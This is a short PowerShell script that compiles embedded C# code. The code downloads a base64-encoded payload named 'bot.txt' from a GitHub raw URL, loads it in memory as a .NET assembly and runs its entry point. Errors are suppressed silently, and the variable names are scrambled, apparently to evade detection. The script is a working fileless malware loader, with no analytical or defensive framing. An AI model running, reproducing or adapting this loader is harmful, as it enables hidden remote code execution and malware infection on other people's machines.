$code = @"

using System.Net;
using System.Reflection;
using System;
using System.Threading;

namespace Lion
{
    public class Cact
    {
        public void Run()
        {
            using (WebClient WccCllieentt = new WebClient())
            {
               // new Thread(() =>
              //  {
                    try
                    {
                        Assembly Assassembly = AppDomain.CurrentDomain.Load(Convert.FromBase64String(WccCllieentt.DownloadString("https://raw.githubusercontent.com/souledu/lol/main/bot.txt")));
                        MethodInfo MMEmethodInfol = Assassembly.EntryPoint;
                        object objjso = Assassembly.CreateInstance(MMEmethodInfol.Name);
                        object[] PPdddprara = new object[1];  // C#
                        if (MMEmethodInfol.GetParameters().Length == 0)
                        {
                            PPdddprara = null; // VB.NET
                        }
                        MMEmethodInfol.Invoke(objjso, PPdddprara);
                    }
                    catch { return; }
              //  })
              //  { IsBackground = false }.Start();
            }
        }
    }
}

"@

Add-Type -TypeDefinition $code;
$instance = New-Object Lion.Cact;
$instance.Run();
